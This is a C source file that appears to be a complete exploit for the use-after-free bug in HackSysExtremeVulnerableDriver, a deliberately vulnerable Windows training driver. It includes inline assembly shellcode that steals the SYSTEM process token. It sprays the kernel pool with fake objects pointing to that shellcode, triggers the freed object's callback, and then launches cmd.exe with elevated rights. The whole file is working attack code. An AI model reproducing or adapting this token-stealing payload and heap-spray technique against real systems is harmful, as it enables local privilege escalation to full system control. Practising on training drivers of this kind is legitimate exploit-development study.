#include<stdio.h>
#include<Windows.h>
typedef void(*CALLfun) ();
typedef struct uaf
{
	CALLfun CALL;
	char BUF[0x54];
}* puaf;
HANDLE hDriver;
DWORD dwBytesOut = 0;
void ShellCode()
{
	__asm
	{
		//int 3
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		retn 
	}
}
int main()
{
	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		return(-1);
	}
	DeviceIoControl(hDriver, 0x222013, NULL, NULL, NULL, 0, &dwBytesOut, NULL);

	DeviceIoControl(hDriver, 0x22201B, NULL, NULL, NULL, 0, &dwBytesOut, NULL);

	puaf buf = (puaf)malloc(0x58);
	buf->CALL = ShellCode;
	// 堆喷占坑
	for (int i = 0; i < 0x1000; i++)
	{
		DeviceIoControl(hDriver, 0x22201F, buf, 0x58, NULL, 0, &dwBytesOut, NULL);
	}
	DeviceIoControl(hDriver, 0x222017, NULL, NULL, NULL, 0, &dwBytesOut, NULL);

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	return 0;
}
